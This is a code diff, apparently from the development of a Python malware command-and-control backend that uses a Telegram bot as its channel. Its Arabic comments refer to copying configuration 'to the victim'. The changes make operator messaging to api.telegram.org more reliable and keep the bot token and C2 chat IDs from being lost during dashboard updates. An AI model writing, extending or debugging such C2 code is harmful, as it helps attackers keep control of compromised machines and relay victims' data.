@@ -357,7 +357,16 @@ def _tg_send_to_channel(message: str):
             pass
     url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
     try:
-        requests.post(url, json={"chat_id": C2_GROUP_ID, "text": message}, timeout=8)
+        r = requests.post(url, json={"chat_id": C2_GROUP_ID, "text": message}, timeout=15)
+        if not r.ok:
+            logger.warning(f"TG send HTTP {r.status_code}: {(r.text or '')[:220]}")
+            return
+        try:
+            jd = r.json()
+            if not jd.get("ok"):
+                logger.warning(f"TG send rejected chat={C2_GROUP_ID}: {jd.get('description', jd)}")
+        except Exception:
+            pass
     except Exception as e:
         logger.error(f"TG send error (group): {e}")
 
@@ -1199,10 +1208,13 @@ def update_telegram_settings():
                 cfg = json.load(f)
         except Exception:
             cfg = {}
+    # لا تمسح التوكن إذا وُجد المفتاح في JSON بقيمة فارغة (تحديث جزئي من الداشبورد).
     if "token" in data:
-        TOKEN = data["token"]
-    if "chat_ids" in data:
-        ALL_CHATS = data["chat_ids"]
+        t = data.get("token")
+        if isinstance(t, str) and t.strip():
+            TOKEN = t.strip()
+    if "chat_ids" in data and data["chat_ids"] is not None:
+        ALL_CHATS = list(data["chat_ids"])
     cfg["token"] = TOKEN
     cfg["chat_ids"] = ALL_CHATS
     if "c2_group_id" in data and data["c2_group_id"] is not None and str(data["c2_group_id"]).strip():
@@ -1231,6 +1243,9 @@ def update_telegram_settings():
 
     C2_GROUP_ID, C2_CHANNEL_ID = resolve_c2_chats(cfg)
     C2_BOT_TOKEN = (TOKEN or _DEFAULT_TOKEN).strip()
+    # إبقاء الملف متطابقاً مع القيم الفعلية بعد resolve_c2_chats (مهم لنسخ telegram_config للضحية).
+    cfg["c2_group_id"] = C2_GROUP_ID
+    cfg["c2_channel_id"] = C2_CHANNEL_ID
     try:
         cfg_dir = os.path.dirname(os.path.abspath(TELEGRAM_CONFIG_PATH))
         if cfg_dir:
